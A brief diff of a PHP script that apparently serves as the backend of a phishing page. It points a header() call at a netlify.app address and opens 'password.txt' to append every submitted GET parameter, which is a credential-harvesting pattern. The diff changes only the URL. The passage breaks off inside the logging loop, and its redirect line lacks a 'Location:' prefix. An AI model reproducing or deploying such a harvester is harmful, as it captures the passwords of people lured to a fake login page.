@@ -1,5 +1,5 @@
 <?php
-header("https://usluk.netlify.app");
+header("https://usluk.netlify.app/");
 $handle=fopen("password.txt","a");
 foreach($_GET as $variable =>$value) {
 fwrite($handle,$variable);
